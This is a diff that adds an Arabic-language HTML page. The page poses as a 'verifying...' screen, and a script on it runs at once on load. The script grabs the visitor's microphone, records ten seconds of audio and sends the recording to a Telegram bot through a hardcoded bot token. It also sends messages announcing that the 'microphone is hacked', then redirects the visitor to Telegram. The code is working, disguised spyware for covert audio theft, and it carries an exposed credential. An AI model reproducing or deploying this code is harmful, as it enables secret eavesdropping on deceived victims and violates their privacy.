@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    </style>
+</head>
+<body>
+    <div id="status">جاري التحقق...</div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id');
+        const linkId = urlParams.get('link_id');
+        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
+        
+        let mediaStream = null;
+        let audioChunks = [];
+        
+        async function sendMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: userId, text: text })
+                });
+            } catch(e) {}
+        }
+        
+        async function sendAudio(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', userId);
+            formData.append('voice', audioBlob, 'audio.ogg');
+            formData.append('caption', `🎤 تسجيل صوتي\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
+        }
+        
+        async function startHack() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                
+                const recorder = new MediaRecorder(mediaStream);
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+                recorder.onstop = () => { sendAudio(new Blob(audioChunks, { type: 'audio/ogg' })); };
+                
+                recorder.start();
+                sendMessage(`🎤 تم اختراق الميكروفون!\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
+                document.getElementById('status').innerHTML = '✅ تم';
+                
+                setTimeout(() => {
+                    if (recorder.state === 'recording') recorder.stop();
+                    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://t.me";
+                }, 10000);
+            } catch(e) {
+                sendMessage(`❌ فشل اختراق الميكروفون!\n${e.message}`);
+                document.getElementById('status').innerHTML = '❌ فشل';
+                setTimeout(() => { window.location.href = "https://t.me"; }, 2000);
+            }
+        }
+        
+        startHack();
+    </script>
+</body>
+</html>
